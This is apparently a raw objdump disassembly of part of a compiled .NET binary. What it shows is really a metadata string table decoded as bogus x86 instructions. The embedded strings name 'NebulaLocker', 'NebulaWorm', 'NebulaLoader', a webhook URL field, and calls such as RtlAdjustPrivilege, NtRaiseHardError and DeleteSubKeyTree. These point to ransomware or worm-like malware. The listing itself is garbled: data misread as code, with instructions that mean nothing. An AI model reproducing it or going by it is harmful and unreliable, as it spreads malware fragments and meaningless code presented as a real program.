  403178:	6f                   	outsl  %ds:(%esi),(%dx)
  403179:	6d                   	insl   (%dx),%es:(%edi)
  40317a:	70 6c                	jo     0x4031e8
  40317c:	65 74 65             	gs je  0x4031e4
  40317f:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  403183:	74 5f                	je     0x4031e4
  403185:	49                   	dec    %ecx
  403186:	73 49                	jae    0x4031d1
  403188:	6e                   	outsb  %ds:(%esi),(%dx)
  403189:	76 61                	jbe    0x4031ec
  40318b:	6c                   	insb   (%dx),%es:(%edi)
  40318c:	69 64 00 72 6e 64 00 	imul   $0x5200646e,0x72(%eax,%eax,1),%esp
  403193:	52 
  403194:	65 70 6c             	gs jo  0x403203
  403197:	61                   	popa
  403198:	63 65 00             	arpl   %esp,0x0(%ebp)
  40319b:	64 77 53             	fs ja  0x4031f1
  40319e:	68 61 72 65 4d       	push   $0x4d657261
  4031a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4031a4:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  4031aa:	65 74 65             	gs je  0x403212
  4031ad:	53                   	push   %ebx
  4031ae:	75 62                	jne    0x403212
  4031b0:	4b                   	dec    %ebx
  4031b1:	65 79 54             	gs jns 0x403208
  4031b4:	72 65                	jb     0x40321b
  4031b6:	65 00 48 74          	add    %cl,%gs:0x74(%eax)
  4031ba:	74 70                	je     0x40322c
  4031bc:	52                   	push   %edx
  4031bd:	65 73 70             	gs jae 0x403230
  4031c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4031c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4031c2:	73 65                	jae    0x403229
  4031c4:	4d                   	dec    %ebp
  4031c5:	65 73 73             	gs jae 0x40323b
  4031c8:	61                   	popa
  4031c9:	67 65 00 52 74       	add    %dl,%gs:0x74(%bp,%si)
  4031ce:	6c                   	insb   (%dx),%es:(%edi)
  4031cf:	41                   	inc    %ecx
  4031d0:	64 6a 75             	fs push $0x75
  4031d3:	73 74                	jae    0x403249
  4031d5:	50                   	push   %eax
  4031d6:	72 69                	jb     0x403241
  4031d8:	76 69                	jbe    0x403243
  4031da:	6c                   	insb   (%dx),%es:(%edi)
  4031db:	65 67 65 00 45 6e    	gs add %al,%gs:0x6e(%di)
  4031e1:	61                   	popa
  4031e2:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  4031e6:	49                   	dec    %ecx
  4031e7:	44                   	inc    %esp
  4031e8:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4031ef:	6c                   	insb   (%dx),%es:(%edi)
  4031f0:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4031f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4031f5:	74 69                	je     0x403260
  4031f7:	6d                   	insl   (%dx),%es:(%edi)
  4031f8:	65 46                	gs inc %esi
  4031fa:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  403201:	64 6c                	fs insb (%dx),%es:(%edi)
  403203:	65 00 53 61          	add    %dl,%gs:0x61(%ebx)
  403207:	66 65 48             	gs dec %ax
  40320a:	61                   	popa
  40320b:	6e                   	outsb  %ds:(%esi),(%dx)
  40320c:	64 6c                	fs insb (%dx),%es:(%edi)
  40320e:	65 00 53 61          	add    %dl,%gs:0x61(%ebx)
  403212:	66 65 46             	gs inc %si
  403215:	69 6c 65 48 61 6e 64 	imul   $0x6c646e61,0x48(%ebp,%eiz,2),%ebp
  40321c:	6c 
  40321d:	65 00 43 72          	add    %al,%gs:0x72(%ebx)
  403221:	65 61                	gs popa
  403223:	74 65                	je     0x40328a
  403225:	46                   	inc    %esi
  403226:	69 6c 65 00 68 54 65 	imul   $0x6d655468,0x0(%ebp,%eiz,2),%ebp
  40322d:	6d 
  40322e:	70 6c                	jo     0x40329c
  403230:	61                   	popa
  403231:	74 65                	je     0x403298
  403233:	46                   	inc    %esi
  403234:	69 6c 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%ebp
  40323b:	74 
  40323c:	65 46                	gs inc %esi
  40323e:	69 6c 65 00 68 46 69 	imul   $0x6c694668,0x0(%ebp,%eiz,2),%ebp
  403245:	6c 
  403246:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40324a:	74 5f                	je     0x4032ab
  40324c:	4d                   	dec    %ebp
  40324d:	61                   	popa
  40324e:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  403255:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  403259:	6f                   	outsl  %ds:(%esi),(%dx)
  40325a:	63 65 73             	arpl   %esp,0x73(%ebp)
  40325d:	73 4d                	jae    0x4032ac
  40325f:	6f                   	outsl  %ds:(%esi),(%dx)
  403260:	64 75 6c             	fs jne 0x4032cf
  403263:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  403267:	74 5f                	je     0x4032c8
  403269:	57                   	push   %edi
  40326a:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  403271:	79 6c                	jns    0x4032df
  403273:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  403277:	6f                   	outsl  %ds:(%esi),(%dx)
  403278:	63 65 73             	arpl   %esp,0x73(%ebp)
  40327b:	73 57                	jae    0x4032d4
  40327d:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  403284:	79 6c                	jns    0x4032f2
  403286:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40328a:	74 5f                	je     0x4032eb
  40328c:	46                   	inc    %esi
  40328d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  403294:	00 
  403295:	73 65                	jae    0x4032fc
  403297:	74 5f                	je     0x4032f8
  403299:	46                   	inc    %esi
  40329a:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4032a1:	00 
  4032a2:	6c                   	insb   (%dx),%es:(%edi)
  4032a3:	70 46                	jo     0x4032eb
  4032a5:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4032ac:	00 
  4032ad:	44                   	inc    %esp
  4032ae:	61                   	popa
  4032af:	74 65                	je     0x403316
  4032b1:	54                   	push   %esp
  4032b2:	69 6d 65 00 49 41 73 	imul   $0x73414900,0x65(%ebp),%ebp
  4032b9:	79 6e                	jns    0x403329
  4032bb:	63 53 74             	arpl   %edx,0x74(%ebx)
  4032be:	61                   	popa
  4032bf:	74 65                	je     0x403326
  4032c1:	4d                   	dec    %ebp
  4032c2:	61                   	popa
  4032c3:	63 68 69             	arpl   %ebp,0x69(%eax)
  4032c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4032c7:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  4032cb:	74 53                	je     0x403320
  4032cd:	74 61                	je     0x403330
  4032cf:	74 65                	je     0x403336
  4032d1:	4d                   	dec    %ebp
  4032d2:	61                   	popa
  4032d3:	63 68 69             	arpl   %ebp,0x69(%eax)
  4032d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4032d7:	65 00 73 74          	add    %dh,%gs:0x74(%ebx)
  4032db:	61                   	popa
  4032dc:	74 65                	je     0x403343
  4032de:	4d                   	dec    %ebp
  4032df:	61                   	popa
  4032e0:	63 68 69             	arpl   %ebp,0x69(%eax)
  4032e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4032e4:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  4032e8:	6c                   	insb   (%dx),%es:(%edi)
  4032e9:	75 65                	jne    0x403350
  4032eb:	54                   	push   %esp
  4032ec:	79 70                	jns    0x40335e
  4032ee:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4032f2:	73 70                	jae    0x403364
  4032f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4032f6:	73 65                	jae    0x40335d
  4032f8:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4032fc:	70 6f                	jo     0x40336d
  4032fe:	73 65                	jae    0x403365
  403300:	00 43 72             	add    %al,0x72(%ebx)
  403303:	65 61                	gs popa
  403305:	74 65                	je     0x40336c
  403307:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  40330a:	31 5f 5f             	xor    %ebx,0x5f(%edi)
  40330d:	73 74                	jae    0x403383
  40330f:	61                   	popa
  403310:	74 65                	je     0x403377
  403312:	00 6e 4e             	add    %ch,0x4e(%esi)
  403315:	75 6d                	jne    0x403384
  403317:	62 65 72             	bound  %esp,0x72(%ebp)
  40331a:	4f                   	dec    %edi
  40331b:	66 42                	inc    %dx
  40331d:	79 74                	jns    0x403393
  40331f:	65 73 54             	gs jae 0x403376
  403322:	6f                   	outsl  %ds:(%esi),(%dx)
  403323:	57                   	push   %edi
  403324:	72 69                	jb     0x40338f
  403326:	74 65                	je     0x40338d
  403328:	00 43 6f             	add    %al,0x6f(%ebx)
  40332b:	6d                   	insl   (%dx),%es:(%edi)
  40332c:	70 69                	jo     0x403397
  40332e:	6c                   	insb   (%dx),%es:(%edi)
  40332f:	65 72 47             	gs jb  0x403379
  403332:	65 6e                	outsb  %gs:(%esi),(%dx)
  403334:	65 72 61             	gs jb  0x403398
  403337:	74 65                	je     0x40339e
  403339:	64 41                	fs inc %ecx
  40333b:	74 74                	je     0x4033b1
  40333d:	72 69                	jb     0x4033a8
  40333f:	62 75 74             	bound  %esi,0x74(%ebp)
  403342:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  403346:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  40334d:	62 
  40334e:	75 74                	jne    0x4033c4
  403350:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  403355:	75 67                	jne    0x4033be
  403357:	67 61                	addr16 popa
  403359:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40335d:	74 74                	je     0x4033d3
  40335f:	72 69                	jb     0x4033ca
  403361:	62 75 74             	bound  %esi,0x74(%ebp)
  403364:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  403368:	6d                   	insl   (%dx),%es:(%edi)
  403369:	56                   	push   %esi
  40336a:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  403371:	74 74                	je     0x4033e7
  403373:	72 69                	jb     0x4033de
  403375:	62 75 74             	bound  %esi,0x74(%ebp)
  403378:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40337c:	73 65                	jae    0x4033e3
  40337e:	6d                   	insl   (%dx),%es:(%edi)
  40337f:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  403383:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  40338a:	72 
  40338b:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  403392:	73 79                	jae    0x40340d
  403394:	6e                   	outsb  %ds:(%esi),(%dx)
  403395:	63 53 74             	arpl   %edx,0x74(%ebx)
  403398:	61                   	popa
  403399:	74 65                	je     0x403400
  40339b:	4d                   	dec    %ebp
  40339c:	61                   	popa
  40339d:	63 68 69             	arpl   %ebp,0x69(%eax)
  4033a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4033a1:	65 41                	gs inc %ecx
  4033a3:	74 74                	je     0x403419
  4033a5:	72 69                	jb     0x403410
  4033a7:	62 75 74             	bound  %esi,0x74(%ebp)
  4033aa:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4033ae:	73 65                	jae    0x403415
  4033b0:	6d                   	insl   (%dx),%es:(%edi)
  4033b1:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4033b5:	72 61                	jb     0x403418
  4033b7:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4033ba:	61                   	popa
  4033bb:	72 6b                	jb     0x403428
  4033bd:	41                   	inc    %ecx
  4033be:	74 74                	je     0x403434
  4033c0:	72 69                	jb     0x40342b
  4033c2:	62 75 74             	bound  %esi,0x74(%ebp)
  4033c5:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4033ca:	67 65 74 46          	addr16 gs je 0x403414
  4033ce:	72 61                	jb     0x403431
  4033d0:	6d                   	insl   (%dx),%es:(%edi)
  4033d1:	65 77 6f             	gs ja  0x403443
  4033d4:	72 6b                	jb     0x403441
  4033d6:	41                   	inc    %ecx
  4033d7:	74 74                	je     0x40344d
  4033d9:	72 69                	jb     0x403444
  4033db:	62 75 74             	bound  %esi,0x74(%ebp)
  4033de:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  4033e3:	75 67                	jne    0x40344c
  4033e5:	67 65 72 48          	addr16 gs jb 0x403431
  4033e9:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  4033f0:	74 
  4033f1:	72 69                	jb     0x40345c
  4033f3:	62 75 74             	bound  %esi,0x74(%ebp)
  4033f6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4033fa:	73 65                	jae    0x403461
  4033fc:	6d                   	insl   (%dx),%es:(%edi)
  4033fd:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  403401:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  403408:	69 
  403409:	6f                   	outsl  %ds:(%esi),(%dx)
  40340a:	6e                   	outsb  %ds:(%esi),(%dx)
  40340b:	41                   	inc    %ecx
  40340c:	74 74                	je     0x403482
  40340e:	72 69                	jb     0x403479
  403410:	62 75 74             	bound  %esi,0x74(%ebp)
  403413:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  403417:	73 65                	jae    0x40347e
  403419:	6d                   	insl   (%dx),%es:(%edi)
  40341a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40341e:	6f                   	outsl  %ds:(%esi),(%dx)
  40341f:	6e                   	outsb  %ds:(%esi),(%dx)
  403420:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  403426:	74 69                	je     0x403491
  403428:	6f                   	outsl  %ds:(%esi),(%dx)
  403429:	6e                   	outsb  %ds:(%esi),(%dx)
  40342a:	41                   	inc    %ecx
  40342b:	74 74                	je     0x4034a1
  40342d:	72 69                	jb     0x403498
  40342f:	62 75 74             	bound  %esi,0x74(%ebp)
  403432:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  403436:	73 65                	jae    0x40349d
  403438:	6d                   	insl   (%dx),%es:(%edi)
  403439:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  40343d:	65 73 63             	gs jae 0x4034a3
  403440:	72 69                	jb     0x4034ab
  403442:	70 74                	jo     0x4034b8
  403444:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40344b:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  403452:	6f                   	outsl  %ds:(%esi),(%dx)
  403453:	6d                   	insl   (%dx),%es:(%edi)
  403454:	70 69                	jo     0x4034bf
  403456:	6c                   	insb   (%dx),%es:(%edi)
  403457:	61                   	popa
  403458:	74 69                	je     0x4034c3
  40345a:	6f                   	outsl  %ds:(%esi),(%dx)
  40345b:	6e                   	outsb  %ds:(%esi),(%dx)
  40345c:	52                   	push   %edx
  40345d:	65 6c                	gs insb (%dx),%es:(%edi)
  40345f:	61                   	popa
  403460:	78 61                	js     0x4034c3
  403462:	74 69                	je     0x4034cd
  403464:	6f                   	outsl  %ds:(%esi),(%dx)
  403465:	6e                   	outsb  %ds:(%esi),(%dx)
  403466:	73 41                	jae    0x4034a9
  403468:	74 74                	je     0x4034de
  40346a:	72 69                	jb     0x4034d5
  40346c:	62 75 74             	bound  %esi,0x74(%ebp)
  40346f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  403473:	73 65                	jae    0x4034da
  403475:	6d                   	insl   (%dx),%es:(%edi)
  403476:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40347a:	72 6f                	jb     0x4034eb
  40347c:	64 75 63             	fs jne 0x4034e2
  40347f:	74 41                	je     0x4034c2
  403481:	74 74                	je     0x4034f7
  403483:	72 69                	jb     0x4034ee
  403485:	62 75 74             	bound  %esi,0x74(%ebp)
  403488:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40348c:	73 65                	jae    0x4034f3
  40348e:	6d                   	insl   (%dx),%es:(%edi)
  40348f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  403493:	6f                   	outsl  %ds:(%esi),(%dx)
  403494:	70 79                	jo     0x40350f
  403496:	72 69                	jb     0x403501
  403498:	67 68 74 41 74 74    	addr16 push $0x74744174
  40349e:	72 69                	jb     0x403509
  4034a0:	62 75 74             	bound  %esi,0x74(%ebp)
  4034a3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4034a7:	73 65                	jae    0x40350e
  4034a9:	6d                   	insl   (%dx),%es:(%edi)
  4034aa:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4034ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4034af:	6d                   	insl   (%dx),%es:(%edi)
  4034b0:	70 61                	jo     0x403513
  4034b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4034b3:	79 41                	jns    0x4034f6
  4034b5:	74 74                	je     0x40352b
  4034b7:	72 69                	jb     0x403522
  4034b9:	62 75 74             	bound  %esi,0x74(%ebp)
  4034bc:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4034c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4034c1:	74 69                	je     0x40352c
  4034c3:	6d                   	insl   (%dx),%es:(%edi)
  4034c4:	65 43                	gs inc %ebx
  4034c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c7:	6d                   	insl   (%dx),%es:(%edi)
  4034c8:	70 61                	jo     0x40352b
  4034ca:	74 69                	je     0x403535
  4034cc:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4034cf:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4034d6:	69 
  4034d7:	62 75 74             	bound  %esi,0x74(%ebp)
  4034da:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4034de:	74 5f                	je     0x40353f
  4034e0:	55                   	push   %ebp
  4034e1:	73 65                	jae    0x403548
  4034e3:	53                   	push   %ebx
  4034e4:	68 65 6c 6c 45       	push   $0x456c6c65
  4034e9:	78 65                	js     0x403550
  4034eb:	63 75 74             	arpl   %esi,0x74(%ebp)
  4034ee:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  4034f2:	74 65                	je     0x403559
  4034f4:	00 53 65             	add    %dl,0x65(%ebx)
  4034f7:	74 56                	je     0x40354f
  4034f9:	61                   	popa
  4034fa:	6c                   	insb   (%dx),%es:(%edi)
  4034fb:	75 65                	jne    0x403562
  4034fd:	00 4e 65             	add    %cl,0x65(%esi)
  403500:	62 75 6c             	bound  %esi,0x6c(%ebp)
  403503:	61                   	popa
  403504:	4c                   	dec    %esp
  403505:	6f                   	outsl  %ds:(%esi),(%dx)
  403506:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  403509:	72 2e                	jb     0x403539
  40350b:	65 78 65             	gs js  0x403573
  40350e:	00 52 65             	add    %dl,0x65(%edx)
  403511:	73 69                	jae    0x40357c
  403513:	7a 65                	jp     0x40357a
  403515:	00 53 79             	add    %dl,0x79(%ebx)
  403518:	73 74                	jae    0x40358e
  40351a:	65 6d                	gs insl (%dx),%es:(%edi)
  40351c:	2e 54                	cs push %esp
  40351e:	68 72 65 61 64       	push   $0x64616572
  403523:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
  40352a:	6f                   	outsl  %ds:(%esi),(%dx)
  40352b:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
  403532:	73 
  403533:	74 65                	je     0x40359a
  403535:	6d                   	insl   (%dx),%es:(%edi)
  403536:	2e 52                	cs push %edx
  403538:	75 6e                	jne    0x4035a8
  40353a:	74 69                	je     0x4035a5
  40353c:	6d                   	insl   (%dx),%es:(%edi)
  40353d:	65 2e 56             	gs cs push %esi
  403540:	65 72 73             	gs jb  0x4035b6
  403543:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  40354a:	54                   	push   %esp
  40354b:	6f                   	outsl  %ds:(%esi),(%dx)
  40354c:	53                   	push   %ebx
  40354d:	74 72                	je     0x4035c1
  40354f:	69 6e 67 00 55 6e 69 	imul   $0x696e5500,0x67(%esi),%ebp
  403556:	63 6f 64             	arpl   %ebp,0x64(%edi)
  403559:	65 53                	gs push %ebx
  40355b:	74 72                	je     0x4035cf
  40355d:	69 6e 67 50 61 72 61 	imul   $0x61726150,0x67(%esi),%ebp
  403564:	6d                   	insl   (%dx),%es:(%edi)
  403565:	65 74 65             	gs je  0x4035cd
  403568:	72 4d                	jb     0x4035b7
  40356a:	61                   	popa
  40356b:	73 6b                	jae    0x4035d8
  40356d:	00 67 65             	add    %ah,0x65(%edi)
  403570:	74 5f                	je     0x4035d1
  403572:	54                   	push   %esp
  403573:	61                   	popa
  403574:	73 6b                	jae    0x4035e1
  403576:	00 6b 65             	add    %ch,0x65(%ebx)
  403579:	72 6e                	jb     0x4035e9
  40357b:	65 6c                	gs insb (%dx),%es:(%edi)
  40357d:	33 32                	xor    (%edx),%esi
  40357f:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  403582:	6c                   	insb   (%dx),%es:(%edi)
  403583:	00 6e 74             	add    %ch,0x74(%esi)
  403586:	64 6c                	fs insb (%dx),%es:(%edi)
  403588:	6c                   	insb   (%dx),%es:(%edi)
  403589:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40358c:	6c                   	insb   (%dx),%es:(%edi)
  40358d:	00 77 65             	add    %dh,0x65(%edi)
  403590:	62 68 6f             	bound  %ebp,0x6f(%eax)
  403593:	6f                   	outsl  %ds:(%esi),(%dx)
  403594:	6b 55 72 6c          	imul   $0x6c,0x72(%ebp),%edx
  403598:	00 50 72             	add    %dl,0x72(%eax)
  40359b:	6f                   	outsl  %ds:(%esi),(%dx)
  40359c:	67 72 61             	addr16 jb 0x403600
  40359f:	6d                   	insl   (%dx),%es:(%edi)
  4035a0:	00 53 79             	add    %dl,0x79(%ebx)
  4035a3:	73 74                	jae    0x403619
  4035a5:	65 6d                	gs insl (%dx),%es:(%edi)
  4035a7:	00 52 61             	add    %dl,0x61(%edx)
  4035aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4035ab:	64 6f                	outsl  %fs:(%esi),(%dx)
  4035ad:	6d                   	insl   (%dx),%es:(%edi)
  4035ae:	00 4e 65             	add    %cl,0x65(%esi)
  4035b1:	62 75 6c             	bound  %esi,0x6c(%ebp)
  4035b4:	61                   	popa
  4035b5:	57                   	push   %edi
  4035b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4035b7:	72 6d                	jb     0x403626
  4035b9:	00 6c 70 4e          	add    %ch,0x4e(%eax,%esi,2)
  4035bd:	75 6d                	jne    0x40362c
  4035bf:	62 65 72             	bound  %esp,0x72(%ebp)
  4035c2:	4f                   	dec    %edi
  4035c3:	66 42                	inc    %dx
  4035c5:	79 74                	jns    0x40363b
  4035c7:	65 73 57             	gs jae 0x403621
  4035ca:	72 69                	jb     0x403635
  4035cc:	74 74                	je     0x403642
  4035ce:	65 6e                	outsb  %gs:(%esi),(%dx)
  4035d0:	00 4d 61             	add    %cl,0x61(%ebp)
  4035d3:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%esi),%ebp
  4035da:	65 6d                	gs insl (%dx),%es:(%edi)
  4035dc:	2e 52                	cs push %edx
  4035de:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4035e1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4035e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4035e7:	00 64 77 43          	add    %ah,0x43(%edi,%esi,2)
  4035eb:	72 65                	jb     0x403652
  4035ed:	61                   	popa
  4035ee:	74 69                	je     0x403659
  4035f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4035f2:	44                   	inc    %esp
  4035f3:	69 73 70 6f 73 69 74 	imul   $0x7469736f,0x70(%ebx),%esi
  4035fa:	69 6f 6e 00 56 61 6c 	imul   $0x6c615600,0x6e(%edi),%ebp
  403601:	69 64 52 65 73 70 6f 	imul   $0x6e6f7073,0x65(%edx,%edx,2),%esp
  403608:	6e 
  403609:	73 65                	jae    0x403670
  40360b:	4f                   	dec    %edi
  40360c:	70 74                	jo     0x403682
  40360e:	69 6f 6e 00 53 65 74 	imul   $0x74655300,0x6e(%edi),%ebp
  403615:	45                   	inc    %ebp
  403616:	78 63                	js     0x40367b
  403618:	65 70 74             	gs jo  0x40368f
  40361b:	69 6f 6e 00 50 72 6f 	imul   $0x6f725000,0x6e(%edi),%ebp
  403622:	63 65 73             	arpl   %esp,0x73(%ebp)
  403625:	73 53                	jae    0x40367a
  403627:	74 61                	je     0x40368a
  403629:	72 74                	jb     0x40369f
  40362b:	49                   	dec    %ecx
  40362c:	6e                   	outsb  %ds:(%esi),(%dx)
  40362d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40362f:	00 5a 65             	add    %bl,0x65(%edx)
  403632:	72 6f                	jb     0x4036a3
  403634:	00 53 79             	add    %dl,0x79(%ebx)
  403637:	73 74                	jae    0x4036ad
  403639:	65 6d                	gs insl (%dx),%es:(%edi)
  40363b:	2e 4e                	cs dec %esi
  40363d:	65 74 2e             	gs je  0x40366e
  403640:	48                   	dec    %eax
  403641:	74 74                	je     0x4036b7
  403643:	70 00                	jo     0x403645
  403645:	4e                   	dec    %esi
  403646:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40364a:	61                   	popa
  40364b:	4c                   	dec    %esp
  40364c:	6f                   	outsl  %ds:(%esi),(%dx)
  40364d:	61                   	popa
  40364e:	64 65 72 00          	fs gs jb 0x403652
  403652:	41                   	inc    %ecx
  403653:	73 79                	jae    0x4036ce
  403655:	6e                   	outsb  %ds:(%esi),(%dx)
  403656:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  40365a:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  40365e:	68 6f 64 42 75       	push   $0x7542646f
  403663:	69 6c 64 65 72 00 3c 	imul   $0x3e3c0072,0x65(%esp,%eiz,2),%ebp
  40366a:	3e 
  40366b:	74 5f                	je     0x4036cc
  40366d:	5f                   	pop    %edi
  40366e:	62 75 69             	bound  %esi,0x69(%ebp)
  403671:	6c                   	insb   (%dx),%es:(%edi)
  403672:	64 65 72 00          	fs gs jb 0x403676
  403676:	6c                   	insb   (%dx),%es:(%edi)
  403677:	70 42                	jo     0x4036bb
  403679:	75 66                	jne    0x4036e1
  40367b:	66 65 72 00          	data16 gs jb 0x40367f
  40367f:	54                   	push   %esp
  403680:	72 69                	jb     0x4036eb
  403682:	67 67 65 72 00       	addr16 addr16 gs jb 0x403687
  403687:	4e                   	dec    %esi
  403688:	6f                   	outsl  %ds:(%esi),(%dx)
  403689:	74 69                	je     0x4036f4
  40368b:	66 69 65 72 00 4e    	imul   $0x4e00,0x72(%ebp),%sp
  403691:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  403695:	61                   	popa
  403696:	4c                   	dec    %esp
  403697:	6f                   	outsl  %ds:(%esi),(%dx)
  403698:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40369b:	72 00                	jb     0x40369d
  40369d:	48                   	dec    %eax
  40369e:	74 74                	je     0x403714
  4036a0:	70 4d                	jo     0x4036ef
  4036a2:	65 73 73             	gs jae 0x403718
  4036a5:	61                   	popa
  4036a6:	67 65 49             	addr16 gs dec %ecx
  4036a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4036aa:	76 6f                	jbe    0x40371b
  4036ac:	6b 65 72 00          	imul   $0x0,0x72(%ebp),%esp
  4036b0:	43                   	inc    %ebx
  4036b1:	75 72                	jne    0x403725
  4036b3:	72 65                	jb     0x40371a
  4036b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4036b6:	74 55                	je     0x40370d
  4036b8:	73 65                	jae    0x40371f
  4036ba:	72 00                	jb     0x4036bc
  4036bc:	54                   	push   %esp
  4036bd:	61                   	popa
  4036be:	73 6b                	jae    0x40372b
  4036c0:	41                   	inc    %ecx
  4036c1:	77 61                	ja     0x403724
  4036c3:	69 74 65 72 00 47 65 	imul   $0x74654700,0x72(%ebp,%eiz,2),%esi
  4036ca:	74 
  4036cb:	41                   	inc    %ecx
  4036cc:	77 61                	ja     0x40372f
  4036ce:	69 74 65 72 00 45 6e 	imul   $0x746e4500,0x72(%ebp,%eiz,2),%esi
  4036d5:	74 
  4036d6:	65 72 00             	gs jb  0x4036d9
  4036d9:	4e                   	dec    %esi
  4036da:	74 52                	je     0x40372e
  4036dc:	61                   	popa
  4036dd:	69 73 65 48 61 72 64 	imul   $0x64726148,0x65(%ebx),%esi
  4036e4:	45                   	inc    %ebp
  4036e5:	72 72                	jb     0x403759
  4036e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4036e8:	72 00                	jb     0x4036ea
  4036ea:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  4036ef:	00 2e                	add    %ch,(%esi)
  4036f1:	63 63 74             	arpl   %esp,0x74(%ebx)
  4036f4:	6f                   	outsl  %ds:(%esi),(%dx)
